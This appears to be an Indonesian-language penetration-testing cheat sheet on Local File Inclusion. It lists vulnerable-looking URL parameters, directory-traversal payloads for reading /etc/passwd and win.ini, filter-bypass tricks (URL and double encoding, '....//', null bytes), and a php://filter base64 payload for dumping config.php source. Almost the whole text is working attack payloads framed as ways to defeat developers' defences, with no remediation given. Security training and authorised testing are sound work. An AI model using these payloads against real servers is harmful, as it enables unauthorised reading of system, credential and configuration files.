# Local File Inclusion (LFI)

LFI (Local File Inclusion) adalah kerentanan di mana sebuah aplikasi web "memasukkan" (include) atau "membaca" (read) file dari _dalam server_ berdasarkan _input_ dari pengguna (biasanya parameter di URL). Kerentanan ini terjadi karena aplikasi terlalu percaya pada input pengguna dan tidak melakukan validasi (penyaringan) yang aman.

***

### Vulnerability Discovery

* Cari Parameter Mencurigakan (Dorking): Fokus pada parameter URL yang sepertinya digunakan untuk memuat bagian halaman.
  * `?page=` (paling umum)
  * `?file=`
  * `?lang=` (misal: `?lang=id.php`)
  * `?template=`
  * `?document=`
  * `?path=`
  * `?style=`
  * `?view=`
* Tes Payload Dasar (Bukti Awal): Gunakan `../` (Directory Traversal) untuk "naik" direktori dan mencoba mengakses file sistem yang umum.
  * Server Linux:
    * Payload: `?page=../../../../etc/passwd`
    * Tujuan: Membaca daftar _username_ di server.
  * Server Windows:
    * Payload: `?page=../../../../Windows/win.ini`
    * Tujuan: Membaca file konfigurasi sistem Windows.

***

### Tips & Trick

* Tips #1: Perang Melawan Filter (Bypass) Developer pasti memblokir `../`. Tugasmu mengakalinya:
  * URL Encoding: Ganti `../` menjadi `%2e%2e%2f` (atau _double encode_ `%252e%252e%252f`).
  * Traversal Aneh: Coba `....//` (kadang server "membersihkannya" jadi `../`).
  * Penyisipan Karakter: Coba `..././.../etc/passwd` atau `.../etc/passwd%00` (_Null Byte_, jika server versi lama).
* Tips #2: Trik Membaca File Kode PHP (SANGAT PENTING!)&#x20;
  * Masalah: Mencoba `?page=config.php` akan menghasilkan halaman kosong, karena server _menjalankan_ (eksekusi) kode PHP itu, bukan _menampilkannya_.
  * Solusi: Gunakan _wrapper_ `php://filter` untuk memaksa server memperlakukan file `.php` sebagai teks biasa.
  * Payload Ajaib: `?page=php://filter/convert.base64-encode/resource=../../config.php`
